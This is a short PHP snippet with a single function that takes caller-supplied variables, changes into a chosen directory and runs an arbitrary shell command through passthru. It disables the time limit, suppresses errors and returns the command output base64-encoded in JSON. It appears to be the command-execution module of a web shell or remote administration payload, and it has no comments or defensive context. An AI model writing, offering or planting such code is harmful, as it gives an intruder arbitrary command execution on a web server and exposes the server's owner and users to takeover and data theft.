<?php
set_time_limit(0);


function run($vars){
    extract($vars);
    $re = array('code'=>1, 'result'=>'');
    chdir($pwd);
    if(function_exists('passthru')){
        @ob_start();
        passthru($cmd);
        $re['result']=@ob_get_contents();
        @ob_end_clean();
        $re['result'] = base64_encode($re['result']);
    }else{
        $re['code'] = 0;
    }
    return json_encode($re);
}